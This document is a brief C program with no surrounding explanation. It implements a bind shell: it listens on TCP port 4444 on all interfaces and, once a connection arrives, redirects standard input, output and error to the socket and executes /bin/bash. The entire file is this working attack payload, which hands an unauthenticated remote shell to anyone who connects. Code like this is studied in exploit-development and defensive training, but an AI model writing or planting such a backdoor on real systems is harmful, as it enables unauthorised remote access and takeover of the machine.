#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {
  int sd = socket(AF_INET, SOCK_STREAM, 0);

  struct sockaddr_in server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(4444);
  server_addr.sin_addr.s_addr = INADDR_ANY;
  bind(sd, (struct sockaddr_in*) &server_addr, sizeof(server_addr));

  listen(sd, 0);
  int c_sd = accept(sd, NULL, NULL);
  dup2(c_sd, 0), dup2(c_sd, 1), dup2(c_sd, 2);

  char *bin_path = "/bin/bash";
  char *args[] = {bin_path, NULL};
  char *envs[] = {NULL};
  execve(bin_path, args, envs);

  return 0;
}